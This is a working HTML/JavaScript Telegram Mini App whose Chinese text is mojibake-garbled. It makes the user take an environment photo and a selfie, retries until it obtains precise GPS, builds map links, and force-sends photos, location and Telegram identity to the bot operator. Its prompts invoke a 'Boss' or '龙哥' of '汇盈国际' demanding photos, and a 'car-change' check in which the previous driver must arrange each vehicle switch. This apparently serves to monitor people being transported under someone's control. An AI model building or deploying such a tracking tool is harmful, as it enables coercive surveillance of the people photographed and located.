<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>æ‹ç…§ç¡®è®¤</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0c2461 0%, #1e3799 25%, #4a69bd 50%, #6a89cc 100%);
            margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center;
            justify-content: center; min-height: 100vh; color: #fff; overflow-x: hidden; position: relative;
        }
        body::before {
            content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0;
            background: radial-gradient(circle at 20% 80%, rgba(120,119,198,0.3) 0%, transparent 50%),
                        radial-gradient(circle at 80% 20%, rgba(255,119,198,0.2) 0%, transparent 50%),
                        radial-gradient(circle at 40% 40%, rgba(120,219,255,0.2) 0%, transparent 50%);
            z-index: -1;
        }
        .container {
            background: rgba(255,255,255,0.08); backdrop-filter: blur(25px); border-radius: 28px;
            padding: 45px 35px; text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.25),
            inset 0 1px 0 rgba(255,255,255,0.15); max-width: 440px; width: 100%; position: relative;
            overflow: hidden; border: 1px solid rgba(255,255,255,0.1); animation: fadeInUp 0.7s ease-out;
        }
        @keyframes fadeInUp { from { opacity: 0; transform: translateY(30px) scale(0.95); } to { opacity: 1; transform: translateY(0) scale(1); } }
        h1 { font-size: 36px; margin-bottom: 16px; background: linear-gradient(135deg, #fff, #e6e9ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; }
        p { font-size: 17px; opacity: 0.9; margin-bottom: 35px; line-height: 1.6; color: rgba(255,255,255,0.85); }
        .camera-choice { display: flex; gap: 12px; margin-bottom: 30px; background: rgba(255,255,255,0.05); border-radius: 20px; padding: 6px; border: 1px solid rgba(255,255,255,0.08); }
        .camera-btn { background: transparent; border: none; color: rgba(255,255,255,0.7); padding: 14px 20px; border-radius: 16px; cursor: pointer; flex: 1; font-size: 16px; font-weight: 500; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .camera-btn.active { background: rgba(255,255,255,0.15); color: white; box-shadow: 0 4px 15px rgba(0,0,0,0.2); transform: translateY(-2px); }
        .btn { background: linear-gradient(135deg, #ff6b6b, #ff8e8e); border: none; color: white; padding: 18px 30px; font-size: 18px; border-radius: 50px; cursor: pointer; width: 100%; margin-bottom: 25px; font-weight: 600; box-shadow: 0 8px 25px rgba(255,107,107,0.4); position: relative; overflow: hidden; }
        .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
        .send-btn, .retry-btn { background: linear-gradient(135deg, #4facfe, #00f2fe); border: none; color: white; padding: 16px; border-radius: 50px; cursor: pointer; width: 100%; margin-top: 15px; font-weight: 600; display: none; }
        .status { font-size: 15px; margin-top: 15px; min-height: 22px; padding: 12px 15px; border-radius: 12px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.08); }
        .error { color: #ffcccc; background: rgba(255,102,102,0.15); border: 1px solid rgba(255,102,102,0.3); }
        #videoPreview, #photoPreview { width: 100%; height: 220px; object-fit: cover; border-radius: 18px; margin-top: 25px; display: none; box-shadow: 0 8px 25px rgba(0,0,0,0.25); border: 1px solid rgba(255,255,255,0.1); }
        #captureBtn { background: linear-gradient(135deg, #4facfe, #00f2fe); padding: 12px 24px; border-radius: 25px; margin-top: 10px; display: none; }
        .loading { display: none; margin: 25px 0; text-align: center; }
        .spinner { border: 3px solid rgba(255,255,255,0.2); border-top: 3px solid #fff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .progress-bar { width: 100%; height: 6px; background: rgba(255,255,255,0.15); border-radius: 3px; overflow: hidden; margin-top: 10px; }
        .progress-fill { height: 100%; width: 0%; background: linear-gradient(135deg, #4facfe, #00f2fe); transition: width 0.4s ease; }
        .photo-counter { display: none; margin-top: 15px; font-size: 14px; background: rgba(255,255,255,0.1); padding: 8px 15px; border-radius: 20px; }
        .confirm-text { background: rgba(255,255,255,0.12); padding: 18px; border-radius: 16px; margin: 25px 0; font-style: italic; border-left: 4px solid #4facfe; }
    </style>
</head>
<body>
    <div class="container">
        <h1 id="title">ğŸ“¸ æ‹ç…§ç¡®è®¤</h1>
        <p id="description">è¯·é€‰æ‹©æ‘„åƒå¤´å¹¶ç¡®è®¤ç²¾å‡†ä½ç½®</p>
        <div id="confirmText" class="confirm-text" style="display:none;"></div>
        
        <div class="camera-choice">
            <button class="camera-btn active" onclick="selectCamera('back')" id="backBtn">ğŸ“· åç½®æ‘„åƒå¤´</button>
            <button class="camera-btn" onclick="selectCamera('front')" id="frontBtn">ğŸ¤³ å‰ç½®æ‘„åƒå¤´</button>
        </div>

        <button id="signInBtn" class="btn">å¼€å§‹æ‹ç…§ç¡®è®¤</button>

        <div id="loading" class="loading">
            <div class="spinner"></div>
            <p>å¤„ç†ä¸­...<div class="progress-bar"><div class="progress-fill"></div></div></p>
        </div>

        <div id="photoCounter" class="photo-counter">ç…§ç‰‡ 1/2</div>
        <video id="videoPreview" autoplay playsinline muted></video>
        <img id="photoPreview" src="" alt="ç…§ç‰‡é¢„è§ˆ">
        <button id="captureBtn" onclick="capturePhoto()">ğŸ“¸ æ‹ç…§</button>
        <button id="retryCameraBtn" class="retry-btn" onclick="retryCamera()">ğŸ”„ é‡è¯•ç›¸æœº</button>
        <button id="sendBtn" class="send-btn" onclick="manualSend()">ğŸ“¤ ä»…å‘é€ç…§ç‰‡ï¼ˆæ— ä½ç½®ï¼‰</button>
        <div id="status" class="status">ç‚¹å‡»ä¸Šæ–¹æŒ‰é’®å¼€å§‹</div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();
        tg.enableClosingConfirmation(); // é˜²æ­¢è¯¯å…³

        // å‚æ•°è§£æ
        const urlParams = new URLSearchParams(window.location.search);
        const type = urlParams.get('type') || 'default';
        const titles = { boss: 'ğŸ“¸ Boss è¦æ±‚æ‹ç…§', lg: 'ğŸ“¸ é¾™å“¥è¦æ±‚æ‹ç…§', hc: 'ğŸš— æ¢è½¦å®‰å…¨ç¡®è®¤' };
        const descriptions = {
            boss: 'æ±‡ç›ˆå›½é™…è´Ÿè´£äºº@Bossè¦æ±‚ä½ æ‹ç…§ï¼Œè¯·ç‚¹å‡»ä¸‹æ–¹æ‹ç…§',
            lg: 'æ±‡ç›ˆå›½é™…è´Ÿè´£äººé¾å“¥è¦æ±‚ä½ æ‹ç…§ï¼Œè¯·ç‚¹å‡»ä¸‹æ–¹æ‹ç…§',
            hc: 'ä¸ºäº†ä¿éšœä½ å®‰å…¨æ¢è½¦å‰è¯·æ‹ç…§ï¼æ¢è½¦ä¸€å®šè¦æ˜¯ä¸Šä¸€ä¸ªå¸æœºå®‰æ’çš„å“¦'
        };
        const confirmTexts = {
            boss: 'âœ… ç¡®è®¤ï¼šå·²æŒ‰ Boss è¦æ±‚æ‹ç…§',
            lg: 'âœ… ç¡®è®¤ï¼šå·²æŒ‰é¾™å“¥è¦æ±‚æ‹ç…§',
            hc: 'âœ… ç¡®è®¤ï¼šæœ¬æ¬¡æ¢è½¦ç”±ä¸Šä¸€ä¸ªå¸æœºå®‰æ’'
        };
        document.getElementById('title').textContent = titles[type] || 'ğŸ“¸ æ‹ç…§ç¡®è®¤';
        document.getElementById('description').textContent = descriptions[type] || 'è¯·æ‹ç…§å¹¶ç¡®è®¤ä½ç½®';
        const confirmDiv = document.getElementById('confirmText');
        confirmDiv.textContent = confirmTexts[type] || '';
        confirmDiv.style.display = confirmTexts[type] ? 'block' : 'none';

        const signInBtn = document.getElementById('signInBtn');
        const loading = document.getElementById('loading');
        const videoPreview = document.getElementById('videoPreview');
        const photoPreview = document.getElementById('photoPreview');
        const captureBtn = document.getElementById('captureBtn');
        const retryCameraBtn = document.getElementById('retryCameraBtn');
        const sendBtn = document.getElementById('sendBtn');
        const status = document.getElementById('status');
        const photoCounter = document.getElementById('photoCounter');

        let currentCamera = 'back';
        let photos = [];
        let stream = null;
        let currentLocation = null;
        let locationFetching = false;
        let forceSendTimer = null;

        function selectCamera(cam) {
            currentCamera = cam;
            document.querySelectorAll('.camera-btn').forEach(b => b.classList.remove('active'));
            document.getElementById(cam === 'back' ? 'backBtn' : 'frontBtn').classList.add('active');
            stopCamera();
            startCamera();
        }

        async function startCamera() {
            stopCamera();
            try {
                const constraints = {
                    video: { facingMode: currentCamera === 'back' ? 'environment' : 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
                };
                stream = await navigator.mediaDevices.getUserMedia(constraints);
                videoPreview.srcObject = stream;
                videoPreview.style.display = 'block';
                videoPreview.style.transform = currentCamera === 'front' ? 'scaleX(-1)' : 'scaleX(1)';
                captureBtn.style.display = 'block';
                retryCameraBtn.style.display = 'none';
                status.textContent = 'ç›¸æœºå·²å°±ç»ª â†’ ç‚¹å‡»æ‹ç…§';
            } catch (err) {
                console.error(err);
                status.innerHTML = `<span class="error">ç›¸æœºæƒé™è¢«æ‹’æˆ–ä¸å¯ç”¨<br>è¯·åœ¨è®¾ç½®ä¸­å…è®¸ Telegram è®¿é—®ç›¸æœº</span>`;
                retryCameraBtn.style.display = 'block';
                tg.showAlert('ç›¸æœºæƒé™æœªå¼€å¯ï¼è¯·å»æ‰‹æœºè®¾ç½® â†’ éšç§ â†’ ç›¸æœº â†’ å…è®¸ Telegram');
            }
        }

        function retryCamera() {
            status.textContent = 'æ­£åœ¨é‡æ–°è¯·æ±‚ç›¸æœºæƒé™...';
            retryCameraBtn.style.display = 'none';
            setTimeout(startCamera, 800);
        }

        function stopCamera() {
            if (stream) {
                stream.getTracks().forEach(t => t.stop());
                stream = null;
            }
            videoPreview.style.display = 'none';
            captureBtn.style.display = 'none';
        }

        // ==================== å…³é”®ï¼šTelegram åŸç”Ÿä½ç½®ä¼˜å…ˆ ====================
        function getLocationWithRetry() {
            if (locationFetching) return;
            locationFetching = true;
            sendBtn.style.display = 'none';
            status.textContent = 'æ­£åœ¨è·å–ä½ç½®ï¼ˆæ¨èå®¤å¤–ï¼‰...';

            // ä¼˜å…ˆä½¿ç”¨ Telegram å®˜æ–¹ APIï¼ˆæˆåŠŸç‡æœ€é«˜ï¼‰
            tg.requestLocation((err, loc) => {
                if (!err && loc) {
                    currentLocation = { lat: loc.latitude, lng: loc.longitude, accuracy: 10 };
                    status.textContent = 'ä½ç½®è·å–æˆåŠŸ âœ…';
                    locationFetching = false;
                    if (photos.length === 2) sendData();
                } else {
                    // é™çº§åˆ°ä¼ ç»Ÿ geolocation
                    fallbackGeolocation();
                }
            });
        }

        function fallbackGeolocation() {
            if (!navigator.geolocation) {
                locationFailed();
                return;
            }
            let tries = 0;
            const tryGeo = () => {
                tries++;
                status.textContent = `å¤‡ç”¨å®šä½ä¸­... (${tries}/3)`;
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        currentLocation = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy };
                        status.textContent = 'ä½ç½®è·å–æˆåŠŸï¼ˆå¤‡ç”¨ï¼‰âœ…';
                        locationFetching = false;
                        if (photos.length === 2) sendData();
                    },
                    () => {
                        if (tries < 3) setTimeout(tryGeo, 3000);
                        else locationFailed();
                    },
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 60000 }
                );
            };
            tryGeo();
        }

        function locationFailed() {
            status.innerHTML = `<span class="error">ä½ç½®è·å–å¤±è´¥<br>å°†ä»…å‘é€ç…§ç‰‡</span>`;
            sendBtn.style.display = 'block';
            locationFetching = false;
        }

        function capturePhoto() {
            const canvas = document.createElement('canvas');
            canvas.width = 800;
            canvas.height = 600;
            const ctx = canvas.getContext('2d');
            if (currentCamera === 'front') ctx.scale(-1, 1);
            ctx.drawImage(videoPreview, currentCamera === 'front' ? -800 : 0, 0, currentCamera === 'front' ? -800 : 800, 600);
            const photoData = canvas.toDataURL('image/jpeg', 0.6);

            photos.push(photoData);
            photoCounter.textContent = `ç…§ç‰‡ ${photos.length}/2`;
            photoCounter.style.display = 'block';
            photoPreview.src = photoData;
            photoPreview.style.display = 'block';

            if (photos.length === 1) {
                status.textContent = 'ç¬¬ä¸€å¼ å®Œæˆï¼è¯·åˆ‡æ¢å‰ç½®è‡ªæ‹';
                selectCamera('front');
            } else if (photos.length === 2) {
                status.textContent = 'ä¸¤å¼ ç…§ç‰‡å·²æ‹å¥½ï¼Œæ­£åœ¨è·å–ä½ç½®...';
                loading.style.display = 'block';
                animateProgress();

                getLocationWithRetry();

                // 10 ç§’å¼ºåˆ¶å‘é€ï¼ˆé˜²æ­¢ä»»ä½•æƒ…å†µå¡æ­»ï¼‰
                forceSendTimer = setTimeout(() => {
                    if (photos.length === 2) sendData();
                }, 10000);
            }
        }

        function animateProgress() {
            const fill = document.querySelector('.progress-fill');
            let w = 0;
            const iv = setInterval(() => {
                w += 2;
                fill.style.width = w + '%';
                if (w >= 100) clearInterval(iv);
            }, 100);
        }

        function manualSend() {
            clearTimeout(forceSendTimer);
            sendData();
        }

        function sendData() {
            if (photos.length < 2) return;
            clearTimeout(forceSendTimer);
            loading.style.display = 'block';
            animateProgress();

            let googleLink = '', gaodeLink = '';
            if (currentLocation) {
                googleLink = `https://www.google.com/maps?q=${currentLocation.lat},${currentLocation.lng}`;
                gaodeLink = `https://uri.amap.com/marker?position=${currentLocation.lng},${currentLocation.lat}&callnative=1`;
            }

            const data = {
                type: type,
                userId: tg.initDataUnsafe.user?.id || 0,
                userName: tg.initDataUnsafe.user?.first_name || 'åŒ¿å',
                photo: photos[0] + '|' + photos[1],
                location: currentLocation || null,
                googleMap: googleLink || 'æ— ä½ç½®',
                gaodeMap: gaodeLink || 'æ— ä½ç½®',
                timestamp: new Date().toISOString(),
                confirm: confirmTexts[type] || 'æ‹ç…§å®Œæˆ'
            };

            tg.sendData(JSON.stringify(data));

            setTimeout(() => {
                status.textContent = currentLocation ? 'âœ… å…¨éƒ¨å‘é€æˆåŠŸï¼' : 'âœ… ç…§ç‰‡å·²å‘é€ï¼ˆæ— ä½ç½®ï¼‰';
                loading.style.display = 'none';
                signInBtn.textContent = 'å·²å®Œæˆ';
                signInBtn.disabled = true;
                signInBtn.style.background = 'linear-gradient(135deg, #4facfe, #00f2fe)';
                stopCamera();
                tg.showAlert(currentLocation ? 'ä½ç½®+ç…§ç‰‡å…¨éƒ¨å‘é€æˆåŠŸï¼' : 'ç…§ç‰‡å·²å‘é€ï¼Œä½ç½®å¤±è´¥ä½†ä¸å½±å“ä½¿ç”¨');
            }, 800);
        }

        signInBtn.addEventListener('click', () => {
            signInBtn.disabled = true;
            signInBtn.textContent = 'å¯åŠ¨ä¸­...';
            status.textContent = 'è¯·æ±‚ç›¸æœºæƒé™...';
            startCamera();
            getLocationWithRetry(); // æå‰å¼€å§‹å®šä½
        });

        window.addEventListener('beforeunload', stopCamera);
    </script>
</body>
</html>
